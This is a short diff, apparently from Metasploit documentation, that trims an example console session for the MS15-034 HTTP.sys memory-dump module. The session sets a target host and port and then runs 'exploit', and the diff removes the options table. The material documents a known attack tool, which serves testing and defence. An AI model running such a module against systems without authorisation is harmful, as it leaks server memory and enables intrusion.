@@ -16,19 +16,7 @@ msf auxiliary(ms15_034_http_sys_memory_dump) > set RHOSTS 10.1.1.125
 RHOSTS => 10.1.1.125
 msf auxiliary(ms15_034_http_sys_memory_dump) > set RPORT 80
 RPORT => 80
-msf auxiliary(ms15_034_http_sys_memory_dump) > show options
 
-Module options (auxiliary/scanner/http/ms15_034_http_sys_memory_dump):
-
-   Name              Current Setting  Required  Description
-   ----              ---------------  --------  -----------
-   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS            10.1.1.125       yes       The target address range or CIDR identifier
-   RPORT             80               yes       The target port
-   SSL               false            no        Negotiate SSL/TLS for outgoing connections
-   SUPPRESS_REQUEST  true             yes       Suppress output of the requested resource
-   TARGETURI         /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)
-   THREADS           1                yes       The number of concurrent threads
 
 msf auxiliary(ms15_034_http_sys_memory_dump) > exploit
 
